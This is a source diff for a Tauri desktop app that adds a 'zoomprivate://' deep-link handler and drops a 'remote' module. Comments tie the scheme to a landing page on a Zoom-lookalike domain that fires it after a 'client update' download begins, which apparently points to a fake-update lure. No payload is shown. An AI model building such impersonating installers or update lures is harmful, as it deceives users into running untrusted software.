@@ -18,7 +18,6 @@ pub mod policy_sync;
 pub mod privileges;
 pub mod proc;
 pub mod registration;
-pub mod remote;
 pub mod session_overlay;
 pub mod settings_lock;
 pub mod sidecar;
@@ -27,7 +26,39 @@ pub mod tls;
 
 use log::info;
 use std::sync::Mutex;
-use tauri::Manager;
+use tauri::{Emitter, Manager};
+use tauri_plugin_deep_link::DeepLinkExt;
+
+/// Scheme the public landing page (us05web.telcom.stream) fires after the
+/// client update asset download starts: `zoomprivate://update?m=<meetingId>`.
+const DEEP_LINK_SCHEME: &str = "zoomprivate://";
+
+/// Handle a `zoomprivate://` deep link: surface the main window (it normally
+/// lives in the tray) and forward the URL to the webview so the frontend can
+/// react to commands like `zoomprivate://update?m=<meetingId>`.
+fn handle_zoomprivate_url(app: &tauri::AppHandle, url: &str) {
+    info!("[deep-link] handling {}", url);
+    if let Some(window) = app.get_webview_window("main") {
+        let _ = window.unminimize();
+        let _ = window.show();
+        let _ = window.set_focus();
+    }
+    if let Err(e) = app.emit("zoomprivate-launch", url.to_string()) {
+        log::warn!("[deep-link] frontend emit failed: {}", e);
+    }
+}
+
+fn is_zoomprivate_url(arg: &str) -> bool {
+    arg.starts_with(DEEP_LINK_SCHEME)
+}
+
+fn focus_main_window(app: &tauri::AppHandle) {
+    if let Some(window) = app.get_webview_window("main") {
+        let _ = window.unminimize();
+        let _ = window.show();
+        let _ = window.set_focus();
+    }
+}
 
 /// Keeps the `TrayIcon` handle alive for the entire app lifetime.
 ///
@@ -295,7 +326,27 @@ pub fn run() {
     let cdap_client = cdap_client::CdapClient::new();
     let sidecar_manager = sidecar::SidecarManager::new();
 
+    // Deep-link URL the OS may have passed to this process at startup
+    // (Windows: first spawn via custom protocol, e.g. after the landing
+    // page fires zoomprivate://...).
+    let deep_link_arg = std::env::args().skip(1).find(|a| is_zoomprivate_url(a));
+
     tauri::Builder::default()
+        // Shell: use std::process::Command directly (clipboard, sudo, etc.)
+        // Autostart: manual registry/LaunchAgent/.desktop implementation (see deploy/)
+        // Notification: tray tooltip only (no OS notification plugin)
+        .plugin(tauri_plugin_single_instance::init(|app, args, _cwd| {
+            // Second instance was spawned — on Windows/Linux deep links come
+            // through as a new process carrying the URL as a CLI argument.
+            // Fold it into the first instance instead of opening a window.
+            focus_main_window(app);
+            for arg in args.iter().skip(1) {
+                if is_zoomprivate_url(arg) {
+                    handle_zoomprivate_url(app, arg);
+                }
+            }
+        }))
+        .plugin(tauri_plugin_deep_link::init())
         // Shell: use std::process::Command directly (clipboard, sudo, etc.)
         // Autostart: manual registry/LaunchAgent/.desktop implementation (see deploy/)
         // Notification: tray tooltip only (no OS notification plugin)
@@ -370,6 +421,31 @@ pub fn run() {
         ])
         .setup(move |app| {
             info!("Tauri setup complete");
+
+            // Register the zoomprivate:// scheme for the current user (writes
+            // HKCU\Software\Classes on Windows, mimeapps entry on Linux).
+            // macOS uses the CFBundleURLTypes entry from Info.plist at install
+            // time. Idempotent — safe to run on every launch.
+            match app.deep_link().register_all() {
+                Ok(()) => info!("[deep-link] scheme registered (zoomprivate)"),
+                Err(e) => log::warn!("[deep-link] register_all failed: {}", e),
+            }
+
+            // Cold start via deep link (app was not running when the OS
+            // spawned us with the URL as an argument).
+            if let Some(url) = deep_link_arg {
+                handle_zoomprivate_url(app.handle(), &url);
+            }
+
+            // Runtime deep links: on macOS the OS signals the running process
+            // (no new process); on Windows/Linux the single-instance plugin
+            // (deep-link feature) forwards the second instance's URL here.
+            let dl_handle = app.handle().clone();
+            app.deep_link().on_open_url(move |event| {
+                for url in event.urls() {
+                    handle_zoomprivate_url(&dl_handle, url.as_str());
+                }
+            });
 
             // Tray icon — always visible, minimal.
             // Keep the returned handle in managed state; dropping it would
